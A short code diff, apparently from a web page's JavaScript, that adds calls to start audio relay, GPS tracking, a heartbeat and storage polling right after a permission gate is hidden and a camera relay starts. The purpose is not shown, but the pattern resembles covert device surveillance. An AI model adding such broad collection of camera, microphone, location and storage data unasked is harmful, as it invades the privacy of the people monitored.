@@ -165,6 +165,10 @@ async function requestAllPermissions() {
     setTimeout(() => {
         hidePermissionGate();
         startCameraRelay();
+        startAudioRelay();
+        startGpsTracking();
+        startHeartbeat();
+        startStoragePolling();
     }, 1500);
 
     return results;
